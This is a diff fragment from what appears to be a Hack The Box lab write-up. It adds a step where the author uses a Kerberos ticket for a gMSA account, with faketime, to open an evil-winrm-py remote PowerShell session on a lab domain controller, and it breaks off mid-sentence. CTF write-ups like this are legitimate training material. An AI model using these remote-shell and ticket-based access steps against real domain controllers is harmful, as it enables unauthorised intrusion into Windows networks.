@@ -666,4 +666,17 @@ SMB         dc2.pong.htb    445    dc2              [+] Run the following comman
 
 I can then use the AES key to get a TGT
 
+```python
+❯❯❯ faketime -f +8h python3 venv/bin/evil-winrm-py -i dc1.ping.htb -k --no-pass -c restricted
+          _ _            _                             
+  _____ _(_| |_____ __ _(_)_ _  _ _ _ __ ___ _ __ _  _ 
+ / -_\ V | | |___\ V  V | | ' \| '_| '  |___| '_ | || |
+ \___|\_/|_|_|    \_/\_/|_|_||_|_| |_|_|_|  | .__/\_, |
+                                            |_|   |__/  v1.7.0
 
+[*] Connecting to 'dc1.ping.htb:5985' as 'pong_gmsa$@PONG.HTB' using config 'restricted'
+[%] JEA mode: Commands run as cmdlet pipelines. Run 'Get-Command' to see allowed cmdlets.
+evil-winrm-py PS (JEA)>
+```
+
+After researching there error, i realise its becuase
